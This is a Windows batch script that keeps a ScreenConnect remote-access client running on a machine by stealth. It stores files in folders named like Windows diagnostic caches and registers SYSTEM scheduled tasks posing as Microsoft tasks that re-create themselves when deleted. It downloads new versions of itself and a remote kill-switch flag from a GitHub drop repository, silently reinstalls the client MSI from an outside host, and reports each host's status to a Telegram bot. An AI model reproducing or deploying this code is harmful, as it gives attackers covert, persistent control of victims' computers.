@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN_MON BUILD 20260802M3 - wipe-proof heal + Telegram state alerts
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
set "LOG=%WD%\boot.err"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "OWN=%WD%\own_run.cmd"
set "MSICACHE=%WD%\pkg.msi"
set "STATE=%WD%\tg_state.txt"
set "CB=%RANDOM%%RANDOM%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "HOST=%COMPUTERNAME%"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
echo mon_tick %DATE% %TIME% M3>>"%LOG%"

REM --- self-rearm persist if someone deleted the tasks ---
schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1
if errorlevel 1 (
  schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
  echo rearm_taskA>>"%LOG%"
)
schtasks /Query /TN "\Microsoft\Windows\PLA\Server" >nul 2>&1
if errorlevel 1 (
  schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%WD2%\etl_mon.cmd\"" >nul 2>&1
  echo rearm_taskB>>"%LOG%"
)
schtasks /Query /TN "\Microsoft\Windows\WDI\ResolutionHost" >nul 2>&1
if errorlevel 1 (
  schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
  echo rearm_onstart>>"%LOG%"
)
schtasks /Query /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" >nul 2>&1
if errorlevel 1 (
  schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
  echo rearm_onlogon>>"%LOG%"
)

REM --- auto-update own.txt + own_mon.cmd from repo ---
set "TMP=%TEMP%\own_upd.txt"
del /f /q "%TMP%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMP%" "%DROP%/own.txt?t=%CB%" >nul 2>&1
if not exist "%TMP%" curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMP%" "%DROP2%/own.txt?t=%CB%" >nul 2>&1
if exist "%TMP%" for %%A in ("%TMP%") do if %%~zA GTR 1000 (
  findstr /C:"OWN BUILD" "%TMP%" >nul && (
    copy /y "%TMP%" "%OWN%" >nul
    echo own_updated>>"%LOG%"
  )
)

set "TMPM=%TEMP%\own_mon_upd.cmd"
del /f /q "%TMPM%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMPM%" "%DROP%/own_mon.cmd?t=%CB%" >nul 2>&1
if not exist "%TMPM%" curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMPM%" "%DROP2%/own_mon.cmd?t=%CB%" >nul 2>&1
if exist "%TMPM%" for %%A in ("%TMPM%") do if %%~zA GTR 400 (
  findstr /C:"OWN_MON BUILD" "%TMPM%" >nul && (
    copy /y "%TMPM%" "%WD%\own_mon.cmd" >nul
    copy /y "%TMPM%" "%WD2%\etl_mon.cmd" >nul
    echo mon_updated>>"%LOG%"
  )
)

REM --- remote panic switch ---
set "FORCE=0"
set "FLG=%TEMP%\rescue.flag"
del /f /q "%FLG%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 30 -o "%FLG%" "%DROP%/rescue.flag?t=%CB%" >nul 2>&1
if not exist "%FLG%" curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 30 -o "%FLG%" "%DROP2%/rescue.flag?t=%CB%" >nul 2>&1
if exist "%FLG%" for %%A in ("%FLG%") do if %%~zA GTR 0 (
  findstr /I /C:"REINSTALL" "%FLG%" >nul && (
    set "FORCE=1"
    echo rescue_flag_active>>"%LOG%"
  )
)

sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 if "%FORCE%"=="0" (
  sc config "%ALT%" start= auto >nul 2>&1
  sc start "%ALT%" >nul 2>&1
  echo primary_ok>>"%LOG%"
  call :TgState OK "PRIMARY OK"
  exit /b 0
)

echo primary_missing_or_forced_reinstall FORCE=%FORCE%>>"%LOG%"
if "%FORCE%"=="1" (
  call :TgState FORCE "rescue.flag REINSTALL - forcing MSI"
) else (
  call :TgState DOWN "PRIMARY DOWN - reinstalling MSI"
)

call :InstallMsi
set "MSI_RC=%ERRORLEVEL%"
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1

sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_restored>>"%LOG%"
  call :TgState RESTORED "PRIMARY RESTORED after heal"
) else (
  echo primary_still_down>>"%LOG%"
  if "%MSI_RC%"=="1" (
    call :TgState FAIL "PRIMARY STILL DOWN - MSI unavailable"
  ) else (
    call :TgState FAIL "PRIMARY STILL DOWN after msiexec"
  )
)
exit /b 0

:InstallMsi
set "MSI=%TEMP%\sc_mon.msi"
del /f /q "%MSI%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 120 -o "%MSI%" "%MSIURL%" >nul 2>&1
if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  copy /y "%MSI%" "%MSICACHE%" >nul
  echo msi_cached>>"%LOG%"
  goto :DoMsi
)
if exist "%MSICACHE%" for %%A in ("%MSICACHE%") do if %%~zA GEQ 500000 (
  copy /y "%MSICACHE%" "%MSI%" >nul
  echo msi_from_cache>>"%LOG%"
  goto :DoMsi
)
echo msi_unavailable>>"%LOG%"
exit /b 1

:DoMsi
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
echo msi_exit_%ERRORLEVEL%>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress
echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"
exit /b 0

REM --- Telegram: only on state CHANGE (no spam every 2m) ---
:TgState
set "NEWSTATE=%~1"
set "MSG=%~2"
set "OLDSTATE="
if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
if /I "%NEWSTATE%"=="%OLDSTATE%" exit /b 0
echo %NEWSTATE%>"%STATE%"
call :TgSend "[SC-MON] %HOST% | %MSG% | state=%NEWSTATE% | %DATE% %TIME%"
exit /b 0

:TgSend
if not exist "%WD%\notify.cfg" exit /b 0
set "TGMSG=%~1"
set "TGFILE=%TEMP%\tg_payload.txt"
(
  echo %TGMSG%
) > "%TGFILE%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue';" ^
  "$cfg=@{}; Get-Content -LiteralPath '%WD%\notify.cfg' | ForEach-Object { if ($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$') { $cfg[$matches[1]] = $matches[2].Trim() } };" ^
  "if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { exit 0 };" ^
  "$text = Get-Content -LiteralPath '%TGFILE%' -Raw;" ^
  "try { Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $cfg.BOT_TOKEN + '/sendMessage') -Method Post -Body @{ chat_id = $cfg.CHAT_ID; text = $text; disable_web_page_preview = 'true' } | Out-Null; Add-Content -LiteralPath '%LOG%' -Value 'tg_sent' } catch { Add-Content -LiteralPath '%LOG%' -Value ('tg_fail ' + $_.Exception.Message) }"
exit /b 0
